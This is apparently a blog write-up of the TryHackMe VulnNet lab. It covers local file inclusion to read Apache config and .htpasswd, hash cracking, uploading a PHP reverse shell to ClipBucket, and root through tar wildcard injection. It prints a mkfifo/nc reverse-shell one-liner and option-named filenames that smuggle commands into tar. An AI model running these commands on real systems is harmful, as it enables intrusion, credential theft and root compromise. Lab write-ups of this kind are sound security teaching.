---
layout: post
title: TryHackMe - VulnNet Write-Up
date: 2026-09-09
classes: wide
description: Turning a hint hidden in the page's JavaScript into local file read, pulling credentials out of the web server's own configuration, and watching a root backup job swallow filenames as command line.
---

# TryHackMe - VulnNet Write-Up

This is the first room of the VulnNet franchise, and it sets the tone: no fancy exploit chain, just a handful of misconfigurations stacked on top of each other until somebody walks out with root.

The room hands you the hostname, so the very first thing is mapping it in `/etc/hosts` — everything below uses `vulnnet.thm` instead of an IP, which also makes the vhost hunting later much easier on the eyes.

![The VulnNet website](/assets/img/post/thm_vulnnet/1.png)

## Initial Scanning

The usual: one port scan to know what we're dealing with.

```sh
nmap -sV -sC -p22,80 vulnnet.thm -oN scans/nmap.txt
```

The output:

```
Nmap scan report for vulnnet.thm (10.145.190.70)
Host is up (0.20s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ea:c9:e8:67:76:0a:3f:97:09:a7:d7:a6:63:ad:c1:2c (RSA)
|   256 0f:c8:f6:d3:8e:4c:ea:67:47:68:84:dc:1c:2b:2e:34 (ECDSA)
|_  256 05:53:99:fc:98:10:b5:c3:68:00:6c:29:41:da:a5:c9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: VulnNet
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Two ports, both boring. SSH is not going anywhere yet, so the web application is the target.

## The Hint Was in the JavaScript

Directory enumeration on the site found the usual furniture:

```sh
ffuf -u http://vulnnet.thm/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .html .php -fc 401,403
```

```
css                     [Status: 301, Size: 308]
fonts                   [Status: 301, Size: 310]
img                     [Status: 301, Size: 308]
index.php               [Status: 200, Size: 5829]
js                      [Status: 301, Size: 307]
login.html              [Status: 200, Size: 2479]
```

A static little news site with a login page that looked like it had no backend behind it. Nothing to log into and nothing to upload — but the page loads two JavaScript files, and the JavaScript turned out to be the actual enumeration target. Two things fell out of it:

```
http://broadcast.vulnnet.thm
http://vulnnet.thm/index.php?referer=
```

A second application that the page never links to, and a parameter that looks like it takes a path. I added the vhost to `/etc/hosts` as well. Browsing it gives a basic authentication prompt:

```
broadcast               [Status: 401, Size: 468]
```

No credentials yet — but now we have an interesting parameter, and parameters that take paths are worth poking.

The lesson here is worth more than the room: the site itself was a decoy, and the enumeration win came from reading the code the browser loads. No wordlist needed.

## Breaking the referer Parameter

Feeding the parameter a path returns the file's contents, which is a Local File Inclusion. One quick check with `/etc/passwd` confirms it:

```sh
curl 'http://vulnnet.thm/index.php?referer=/etc/passwd'
```

Then a proper sweep to see how far it goes, filtering the size of the normal page (`5829`) so only real file reads show up:

```sh
ffuf -u http://vulnnet.thm/index.php?referer=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -fs 5829
```

Roughly a hundred files came back readable, including the ones that matter:

```
/etc/hosts               [Status: 200, Size: 6060]
/etc/fstab               [Status: 200, Size: 6292]
/etc/crontab             [Status: 200, Size: 6592]
/etc/apache2/apache2.conf [Status: 200, Size: 13053]
/etc/passwd              [Status: 200, Size: 7660]
```

My instinct with an LFI is always "log poisoning, somewhere to write, somewhere to execute" — and I spent time looking for a log I could poison. That was the wrong instinct here, and the cheaper path was sitting right in the file list: on an Apache box, the configuration tells you where the credentials live.

## Credentials in the Web Server's Own Config

Reading the vhost configuration exposes the whole authentication setup of the second application:

```sh
curl 'http://vulnnet.thm/index.php?referer=/etc/apache2/sites-enabled/000-default.conf'
```

```
ServerName broadcast.vulnnet.thm
AuthType Basic
AuthName "Restricted Content"
AuthUserFile /etc/apache2/.htpasswd
Require valid-user
```

`AuthUserFile` is a gift: it's an absolute path, and I can read it with the same parameter.

```sh
curl 'http://vulnnet.thm/index.php?referer=/etc/apache2/.htpasswd'
```

```
developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0
```

An `apr1` hash is worth a wordlist, and hashcat made short work of it — the fingerprint identified the type immediately, then rockyou did the rest:

```
hashcat --identify
hashcat -m 1600 -O apache_hash.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```

```text
developers : 9972761drmfsls
```

So one application leaked the credentials of another, and the forgotten vhost behind basic auth was the weakest door in the building.

## ClipBucket and the Upload

`broadcast.vulnnet.thm` is ClipBucket, a video streaming platform, running version 4.0 — which carries a handful of known vulnerabilities, the useful one being an unauthenticated file upload. Just add credentials, because the site is behind basic auth.

I grabbed the classic PentestMonkey reverse shell, set my listener IP and port, and pushed it through the upload endpoint:

```sh
curl -F "file=@monkey.php" -F "plupload=1" -F "name=monkey.php" http://broadcast.vulnnet.thm/actions/photo_uploader.php -u developers:9972761drmfsls
```

The application stores uploads under `files/photo/`, in a directory named with the current date. Browse to it and the shell fires against a waiting listener — I catch mine with [Penelope](https://github.com/brightio/penelope), which upgrades the connection to a full PTY automatically:

```sh
penelope 4444
```

That upgrade is not cosmetic here: from this point on everything is interactive file handling, and a raw shell makes it miserable.

![The ClipBucket application behind the vhost](/assets/img/post/thm_vulnnet/2.png)

## The Backup Directory

Enumeration as `www-data` paid off quickly: `/var/backups` contained a file called `ssh-backup.tar.gz`, and nothing in that directory usually needs to be secret.

```sh
cp /var/backups/ssh-backup.tar.gz /tmp
cd /tmp && tar xzf ssh-backup.tar.gz
```

Inside was an SSH private key. It's encrypted (`Proc-Type: 4,ENCRYPTED`), so it asks for a passphrase — which is not a serious obstacle, it's just another hash to crack:

```sh
ssh2john id_rsa > rsa_hash.txt
hashcat --identify rsa_hash.txt
hashcat -m 22931 -O rsa_hash.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```

And the passphrase:

```text
oneTWO3gOyac
```

With the key and its passphrase, SSH into the account it belongs to:

```sh
ssh -i id_rsa server-management@vulnnet.thm
```

The user flag is waiting in that home directory, in `user.txt`:

```text
THM{907e420d...}
```

A quick detour here: I also copied the Firefox profile out of that account and ran `firepwd` against it, hoping to find saved passwords. Nothing usable came out of it — it was a decoy, which is a good reminder that not every piece of loot is the next step in the chain.

## Root: Wildcard in the Backup Job

A backup script running as root is the kind of thing that always deserves a second look, and `/etc/crontab` had exactly that: a job running `/var/opt/backupsrv.sh` as `root`, on a 30 second schedule — faster than any human backup needs to be.

The script backs up the user's Documents directory:

```sh
#!/bin/bash
dest="/var/backups"
cd /home/server-management/Documents
backup_files="*"
archive_file="$hostname-$day.tgz"
tar czf $dest/$archive_file $backup_files
```

There's the vulnerability, and it has nothing to do with the script's permissions: `tar czf $dest/$archive_file $backup_files` expands a wildcard inside a directory where I can write files. `tar` treats filenames as command-line arguments, so a file whose *name* looks like an option is an option.

Two files with option-looking names, plus a script for the tar to execute:

```sh
cd /home/server-management/Documents
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.129.138 4443 >/tmp/f' > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```

And `shell.sh` containing a `mkfifo` reverse shell back to my machine. The next time the cron job fires — 30 seconds later — the backup script is still just doing its job, and `tar` cheerfully runs my script as root. The root flag is where it always is:

```text
THM{220b671d...}
```

## Lessons Learned

What I like about this room is that every step is a misconfiguration somebody chose, and none of them is exotic. The credentials were not breached, they were *read* — out of the web server's own configuration, through a file inclusion parameter that the site's JavaScript gave away. The SSH key wasn't stolen from a hardened vault, it was sitting in a backup directory. And root didn't come from a kernel exploit, it came from a backup script that runs `tar` with a wildcard as root, thirty seconds at a time.

The two habits worth keeping from this one: read the JavaScript before you fuzz the directories, and when an LFI lands in your lap, look at the configuration files before you go hunting for a log to poison. Cheapest path first.

Hack on!
